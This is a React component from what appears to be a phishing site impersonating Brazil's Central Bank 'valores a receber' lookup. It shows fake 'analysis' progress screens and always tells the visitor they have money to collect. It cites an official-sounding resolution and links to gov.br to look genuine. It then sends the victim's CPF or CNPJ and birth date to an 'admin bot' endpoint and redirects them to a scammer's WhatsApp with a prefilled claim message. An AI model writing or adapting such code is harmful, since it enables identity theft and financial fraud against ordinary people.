import { useEffect, useState } from "react";
import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";

interface Step2Props {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

type AnalysisState = "checking_base" | "verifying_identity" | "finalizing" | "results";

export function Step2({ data, onReset }: Step2Props) {
  const [analysisState, setAnalysisState] = useState<AnalysisState>("checking_base");
  const [config, setConfig] = useState({ 
    whatsappNumber: typeof window !== 'undefined' ? (localStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
  });
  const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
  const [processStep, setProcessStep] = useState(0);

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API_URL}/api/config?t=${Date.now()}`);
        if (response.data.whatsappNumber) {
          console.log("✅ Número sincronizado dinamicamente:", response.data.whatsappNumber);
          setConfig(response.data);
          // Salvar para o navegador não esquecer se houver oscilação
          localStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
        }
      } catch (err) {
        console.error("Falha na sincronia modular. Usando memória local.");
        const lastSaved = localStorage.getItem('svr_last_whatsapp');
        if (lastSaved) setConfig({ whatsappNumber: lastSaved });
      }
    };
    fetchConfig();

    const timers = [
      setTimeout(() => setAnalysisState("verifying_identity"), 2500),
      setTimeout(() => setAnalysisState("finalizing"), 4500),
      setTimeout(() => setAnalysisState("results"), 6500),
    ];

    return () => timers.forEach(clearTimeout);
  }, []);

  const calculateValue = (doc: string) => {
    // Deterministic value based on document digits
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    const value = (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
    return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  const handleWhatsAppRedirect = () => {
    setIsProcessingWhatsApp(true);

    // Sequence of "automatic" verification steps
    const steps = [
      "Sincronizando protocolo de segurança...",
      "Validando titularidade fiscal...",
      "Gerando token de liberação única...",
      "Conectando ao canal de atendimento prioritário..."
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length - 1) {
        currentStep++;
        setProcessStep(currentStep);
      } else {
        clearInterval(interval);

        const userId = localStorage.getItem('svr_user_id') || "N/A";
        const protocol = `SVR-${userId.toUpperCase()}`;
        const token = btoa(data.docValue).substring(0, 12).toUpperCase();

        const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
        const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
          `*DETALHES DA SOLICITAÇÃO:* \n` +
          `• Protocolo: *#${protocol}*\n` +
          `• Token de Validação: *${token}*\n` +
          `• Tipo de Documento: *${data.docType}*\n` +
          `• Documento Identificado: *${data.docValue}*\n\n` +
          `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;

        const message = encodeURIComponent(header + "\n\n" + body);

        // Notify Admin Bot IMMEDIATELY upon click
        const notifyConversion = async () => {
          try {
            const userIdForApi = localStorage.getItem('svr_user_id');
            if (userIdForApi) {
              await axios.post(`${API_URL}/api/v1/session/convert`, {
                userId: userIdForApi,
                details: { 
                  docValue: data.docValue, 
                  birthDate: data.birthDate,
                  protocol: protocol,
                  token: token
                }
              });
            }
          } catch (e) { 
            console.error("Erro na conversão antecipada:", e);
          }
        };

        notifyConversion().finally(() => {
          window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
        });
      }
    }, 1200);
  };

  const AnalysisLoader = ({ text }: { text: string }) => (
    <div className="flex flex-col items-center justify-center p-16 bg-white dark:bg-[#1f292e] rounded shadow-sm border border-gray-100 dark:border-[#2a373d] max-w-[420px] mx-auto text-center space-y-6 min-h-[450px] transition-colors duration-300">
      <div className="relative">
        <Loader2 className="w-16 h-16 text-[#2d7890] dark:text-[#429bb8] animate-spin" strokeWidth={1.5} />
        <div className="absolute inset-0 flex items-center justify-center">
          <Search size={24} className="text-[#2d7890] dark:text-[#429bb8] opacity-50" />
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-xl font-bold text-gray-800 dark:text-gray-200 tracking-tight transition-colors duration-300">{text}</h3>
        <div className="flex gap-1 justify-center">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2 h-2 bg-[#2d7890] rounded-full"
              animate={{ opacity: [0.3, 1, 0.3] }}
              transition={{ repeat: Infinity, duration: 1.5, delay: i * 0.2 }}
            />
          ))}
        </div>
      </div>
      <p className="text-sm text-gray-500 dark:text-gray-400 font-medium opacity-60 transition-colors duration-300">Sincronizando com as bases do Banco Central...</p>
    </div>
  );

  return (
    <AnimatePresence mode="wait">
      {analysisState === "checking_base" && (
        <motion.div key="check" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Analisando base de CPFs/CNPJs..." />
        </motion.div>
      )}
      {analysisState === "verifying_identity" && (
        <motion.div key="verify" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Verificando saldos residuais..." />
        </motion.div>
      )}
      {analysisState === "finalizing" && (
        <motion.div key="final" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Finalizando consulta segura..." />
        </motion.div>
      )}

      {analysisState === "results" && (
        <motion.div
          key="results"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[800px] mx-auto shadow-sm transition-colors duration-300"
        >
          <div className="p-6 md:p-12">
            
            <div className="flex flex-col md:flex-row items-center md:items-start gap-8 mb-10">
              {/* Large Green Checkmark */}
              <div className="w-20 h-20 md:w-28 md:h-28 flex-shrink-0">
                <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
                  <circle cx="26" cy="26" r="25" fill="none" stroke="currentColor" strokeWidth="1.5"/>
                  <path fill="none" stroke="currentColor" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" d="M14 27l8 8 16-16" />
                </svg>
              </div>

              {/* Title and Header Info */}
              <div className="text-center md:text-left flex-grow">
                <h2 className="text-[22px] md:text-[28px] font-bold text-[#455a64] dark:text-white leading-tight mb-4">
                  O {data.docType} pesquisado tem valores a receber
                </h2>
                <div className="text-[15px] md:text-[17px] text-[#666] dark:text-gray-400 space-y-1">
                  <p className="flex justify-center md:justify-start gap-2 uppercase tracking-wide font-medium">
                    <span>{data.docType}:</span>
                    <span className="text-[#333] dark:text-gray-200">{data.docValue}</span>
                  </p>
                  <p className="flex justify-center md:justify-start gap-2 font-medium">
                    <span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span>
                    <span className="text-[#333] dark:text-gray-200">{data.birthDate}</span>
                  </p>
                </div>
              </div>
            </div>

            {/* Grey Banner - Formal Legal Notice */}
            <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-5 text-center mb-8 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-sm">
              <p className="text-[15px] md:text-[16px] font-bold text-[#444] dark:text-gray-100 uppercase tracking-tight">
                A liberação dos ativos identificados exige a conformidade com os protocolos de segurança jurídica vigentes.
              </p>
            </div>

            {/* Detailed Formal Info */}
            <div className="w-full space-y-6 text-[15px] md:text-[16px] text-[#444] dark:text-gray-300 leading-relaxed max-w-none text-justify md:text-left">
              <p>
                Informamos que o procedimento de resgate de valores acumulados é regido pela <b>Resolução BCB nº 4.862/2020</b> e exige a conclusão integral das etapas de validação de titularidade fiscal e bancária.
              </p>
              <p>
                Para garantir a integridade da transferência e evitar fraudes contra o sistema financeiro, a liberação ocorre exclusivamente mediante <b>autenticação em tempo real</b> realizada através de nossos canais oficiais de atendimento especializado.
              </p>
              <p>
                O sistema processará a transferência dos ativos para a conta informada assim que a homologação documental for concluída. Este processo possui validade jurídica e fé pública.
              </p>
            </div>

            {/* Action Buttons */}
            <div className="w-full pt-12 space-y-4">
              {/* Main Button */}
              <div className="flex justify-center md:justify-start">
                <button
                  onClick={handleWhatsAppRedirect}
                  className="w-full md:w-auto min-w-[280px] bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3.5 px-10 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm uppercase tracking-wider"
                >
                  <CheckCircle2 size={20} /> Liberar Valores Disponíveis
                </button>
              </div>

              {/* Secondary Buttons Row */}
              <div className="flex flex-col md:flex-row gap-3 pt-2">
                <button
                  onClick={onReset}
                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-8 rounded-sm flex items-center justify-center gap-2.5 transition-all text-[14px] shadow-sm uppercase min-w-[180px]"
                >
                  <Search size={18} strokeWidth={3} /> Nova consulta
                </button>
                <button
                  onClick={() => window.location.reload()}
                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-8 rounded-sm flex items-center justify-center gap-2.5 transition-all text-[14px] shadow-sm uppercase min-w-[180px]"
                >
                  <div className="w-5 h-5 rounded-full border-2 border-white flex items-center justify-center">
                    <X size={14} strokeWidth={4} />
                  </div>
                  Sair
                </button>
              </div>
            </div>

            {/* Bottom Link */}
            <div className="pt-10 text-center md:text-left">
              <a 
                href="https://acesso.gov.br" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
              >
                *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
              </a>
            </div>

          </div>
        </motion.div>
      )}



      {isProcessingWhatsApp && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-[#1b668d]/95 z-[100] flex flex-col items-center justify-center p-8 text-white text-center"
        >
          <div className="w-full max-w-[320px] space-y-8">
            <div className="relative flex items-center justify-center">
              <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
              <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
            </div>

            <div className="space-y-4">
              <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
              <div className="space-y-2">
                {[0, 1, 2, 3].map((i) => (
                  <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
                    {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
                    <span className={i === processStep ? 'font-bold' : ''}>
                      {[
                        "Sincronizando protocolo de segurança...",
                        "Validando titularidade fiscal...",
                        "Gerando token de liberação única...",
                        "Conectando ao canal de atendimento prioritário..."
                      ][i]}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}


